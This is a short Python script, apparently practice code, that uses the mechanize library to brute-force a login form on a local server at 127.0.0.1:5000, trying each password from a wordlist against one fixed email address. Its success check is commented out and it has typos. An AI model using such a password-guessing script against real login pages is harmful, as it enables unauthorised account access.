import mechanize
b = mechanize.Browser()

url="http://127.0.0.1:5000/login"
wolrdlist="wordlist.txt"

try:
    wolrdlist =open(wolrdlist,"r")
    
except:
    print("\n Worldlist Not Found")
    quit()
    
for password in wolrdlist:
    print (wolrdlist)
    respone =b.open(url)
    b.select_form(nr=0)
    
    print(b)
    
    b.form['EMail'] ='kam@adf.com'
    print(b.form)
    b.form['Password'] = password.strip()
    print( password.strip())
    #b.method = "POST"
    response  =b.submit()
    
    #if response.geturl() =="http://127.0.0.1:5000/login":
     #   print("Password Found :") +password.strip()
      #  break
    
    
    